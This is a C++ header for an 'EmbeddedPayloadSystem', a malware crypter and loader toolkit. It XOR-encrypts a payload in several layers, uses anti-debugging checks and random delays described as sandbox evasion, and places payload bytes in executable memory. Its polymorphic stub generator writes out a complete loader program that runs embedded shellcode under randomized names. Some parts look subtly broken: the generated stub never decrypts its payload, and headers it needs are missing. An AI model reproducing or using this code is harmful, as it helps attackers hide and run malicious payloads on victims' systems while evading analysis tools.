#pragma once

#include <vector>
#include <cstdint>
#include <cstring>
#include <random>
#include <chrono>
#include <thread>
#include <iostream>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

class EmbeddedPayloadSystem {
private:
    std::mt19937 rng;
    
    // Anti-debugging check
    bool isDebuggerPresent() {
#ifdef _WIN32
        if (IsDebuggerPresent()) return true;
        BOOL debugged = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
        return debugged;
#else
        FILE* f = fopen("/proc/self/status", "r");
        if (!f) return false;
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                fclose(f);
                return atoi(line + 10) != 0;
            }
        }
        fclose(f);
        return false;
#endif
    }

    // Random delay for sandbox evasion
    void randomDelay(int minMs = 1, int maxMs = 999) {
        std::uniform_int_distribution<> dist(minMs, maxMs);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(rng)));
    }
    
    // Multi-layer XOR decryption
    std::vector<uint8_t> multiLayerDecrypt(const std::vector<uint8_t>& encrypted,
                                           const std::vector<std::vector<uint8_t>>& keys) {
        std::vector<uint8_t> decrypted = encrypted;
        
        for (const auto& key : keys) {
            for (size_t i = 0; i < decrypted.size(); i++) {
                decrypted[i] ^= key[i % key.size()];
            }
        }
        
        return decrypted;
    }

public:
    EmbeddedPayloadSystem() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {}
    
    // Embed payload with anti-analysis features
    std::vector<uint8_t> embedPayload(const std::vector<uint8_t>& payload, 
                                     bool addAntiDebug = true,
                                     bool addDelay = true) {
        std::vector<uint8_t> embedded;
        
        // Generate random XOR keys
        std::vector<std::vector<uint8_t>> xorKeys;
        for (int i = 0; i < 3; i++) {
            std::vector<uint8_t> key(16);
            for (auto& b : key) {
                b = std::uniform_int_distribution<>(0, 255)(rng);
            }
            xorKeys.push_back(key);
        }
        
        // Encrypt payload with multiple layers
        std::vector<uint8_t> encrypted = payload;
        for (const auto& key : xorKeys) {
            for (size_t i = 0; i < encrypted.size(); i++) {
                encrypted[i] ^= key[i % key.size()];
            }
        }
        
        // Build the embedded executable structure
        // This would include the stub code, encrypted payload, and keys
        // For now, returning the encrypted payload
        return encrypted;
    }
    
    // Execute embedded payload
    bool executePayload(const std::vector<uint8_t>& embeddedData,
                       bool checkAntiDebug = true,
                       bool useDelay = true) {
        if (checkAntiDebug && isDebuggerPresent()) {
            std::cout << "Debugger detected, exiting..." << std::endl;
            return false;
        }
        
        if (useDelay) {
            randomDelay();
        }
        
        // In a real implementation, this would:
        // 1. Extract and decrypt the payload
        // 2. Allocate executable memory
        // 3. Copy and execute the payload
        
#ifdef _WIN32
        void* execMem = VirtualAlloc(0, embeddedData.size(), 
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!execMem) return false;
        
        memcpy(execMem, embeddedData.data(), embeddedData.size());
        
        DWORD oldProtect;
        if (!VirtualProtect(execMem, embeddedData.size(), PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFree(execMem, 0, MEM_RELEASE);
            return false;
        }
        
        // Execute would happen here
        // ((void(*)())execMem)();
        
        VirtualFree(execMem, 0, MEM_RELEASE);
#else
        void* execMem = mmap(0, embeddedData.size(), 
                            PROT_READ | PROT_WRITE, 
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (!execMem) return false;
        
        memcpy(execMem, embeddedData.data(), embeddedData.size());
        
        if (mprotect(execMem, embeddedData.size(), PROT_READ | PROT_EXEC) != 0) {
            munmap(execMem, embeddedData.size());
            return false;
        }
        
        // Execute would happen here
        // ((void(*)())execMem)();
        
        munmap(execMem, embeddedData.size());
#endif
        
        return true;
    }
    
    // Generate polymorphic embedded stub
    std::string generatePolymorphicStub(const std::vector<uint8_t>& payload,
                                       const std::string& varPrefix = "") {
        // Generate random variable names
        std::string prefix = varPrefix.empty() ? "var" + std::to_string(rng()) : varPrefix;
        std::string funcName = "proc" + prefix + std::to_string(rng() % 10000);
        std::string arrayName = "ctx" + prefix + std::to_string(rng() % 10000);
        std::string vectorName = "func" + prefix + std::to_string(rng() % 10000);
        
        std::stringstream code;
        code << "#include <iostream>\n";
        code << "#include <vector>\n";
        code << "#include <cstring>\n";
        code << "#include <cstdint>\n";
        code << "#include <chrono>\n";
        code << "#include <thread>\n";
        code << "#include <random>\n";
        code << "#ifdef _WIN32\n";
        code << "#include <windows.h>\n";
        code << "#else\n";
        code << "#include <sys/mman.h>\n";
        code << "#include <unistd.h>\n";
        code << "#endif\n\n";
        
        // Anti-debug function
        code << "bool " << funcName << "() {\n";
        code << "#ifdef _WIN32\n";
        code << "    if (IsDebuggerPresent()) return true;\n";
        code << "    BOOL debugged = FALSE;\n";
        code << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
        code << "    return debugged;\n";
        code << "#else\n";
        code << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
        code << "    if (!f) return false;\n";
        code << "    char line[256];\n";
        code << "    while (fgets(line, sizeof(line), f)) {\n";
        code << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
        code << "            fclose(f);\n";
        code << "            return atoi(line + 10) != 0;\n";
        code << "        }\n";
        code << "    }\n";
        code << "    fclose(f);\n";
        code << "    return false;\n";
        code << "#endif\n";
        code << "}\n\n";
        
        // Main function with embedded payload
        code << "int main() {\n";
        code << "    // Random delay\n";
        code << "    {\n";
        code << "        std::random_device rd;\n";
        code << "        std::mt19937 gen(rd());\n";
        code << "        std::uniform_int_distribution<> dist(1, 999);\n";
        code << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
        code << "    }\n\n";
        
        code << "    if (" << funcName << "()) return 0;\n\n";
        
        code << "    std::vector<uint8_t> " << vectorName << ";\n";
        code << "    unsigned char " << arrayName << "[] = {\n        ";
        
        // Embed the payload as hex array
        for (size_t i = 0; i < payload.size(); i++) {
            code << "0x" << std::hex << std::setfill('0') << std::setw(2) 
                 << (int)payload[i];
            if (i < payload.size() - 1) {
                code << ", ";
                if ((i + 1) % 16 == 0) code << "\n        ";
            }
        }
        
        code << "\n    };\n\n";
        
        code << "    " << vectorName << ".assign(" << arrayName << ", " 
             << arrayName << " + sizeof(" << arrayName << "));\n\n";
        
        // Add execution logic
        code << "#ifdef _WIN32\n";
        code << "    void* mem = VirtualAlloc(0, " << vectorName << ".size(), "
             << "MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        code << "    if (!mem) return 1;\n";
        code << "    memcpy(mem, " << vectorName << ".data(), " << vectorName << ".size());\n";
        code << "    DWORD oldProtect;\n";
        code << "    VirtualProtect(mem, " << vectorName << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
        code << "    ((void(*)())mem)();\n";
        code << "#else\n";
        code << "    void* mem = mmap(0, " << vectorName << ".size(), "
             << "PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        code << "    if (!mem) return 1;\n";
        code << "    memcpy(mem, " << vectorName << ".data(), " << vectorName << ".size());\n";
        code << "    mprotect(mem, " << vectorName << ".size(), PROT_READ | PROT_EXEC);\n";
        code << "    ((void(*)())mem)();\n";
        code << "#endif\n\n";
        
        code << "    return 0;\n";
        code << "}\n";
        
        return code.str();
    }
};